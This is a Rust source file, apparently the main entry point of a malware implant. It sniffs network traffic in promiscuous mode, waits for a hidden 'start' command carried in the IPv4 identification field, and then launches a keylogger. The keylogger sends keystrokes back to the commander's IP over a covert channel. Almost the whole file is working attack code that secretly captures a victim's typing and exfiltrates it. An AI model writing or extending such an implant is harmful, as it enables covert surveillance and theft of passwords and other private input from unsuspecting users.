mod keylogger;
mod covert;

use pcap::{Capture, Device};
use pnet::packet::ipv4::Ipv4Packet;
use crate::covert::CovertChannel;
use std::net::Ipv4Addr;

fn main() {
    println!("[*] Victim waiting for Commander signal...");

    // 1. Automatically find the active interface
    let device = Device::lookup().expect("No active interface found").expect("No devices found");
    let mut cap = Capture::from_device(device)
        .unwrap()
        .promisc(true)
        .immediate_mode(true)
        .open()
        .unwrap();

    // 2. Listen for the "Start" command (0x10) in the IPID field
    while let Ok(packet) = cap.next_packet() {
        if packet.data.len() > 34 {
            if let Some(ip_packet) = Ipv4Packet::new(&packet.data[14..]) {
                let cmd = ip_packet.get_identification();
                
                if cmd == 0x10 { // CMD_START_LOGGER
                    let commander_ip = ip_packet.get_source();
                    println!("[+] Signal received from Commander: {}", commander_ip);
                    
                    // 3. Start keylogger pointing back to whoever sent the signal
                    let channel = CovertChannel::new(commander_ip);
                    keylogger::start(channel);
                    break; // Exit the listener loop and keep keylogger running
                }
            }
        }
    }

    // Keep the main thread alive while the keylogger thread works
    loop {
        std::thread::sleep(std::time::Duration::from_secs(60));
    }
}
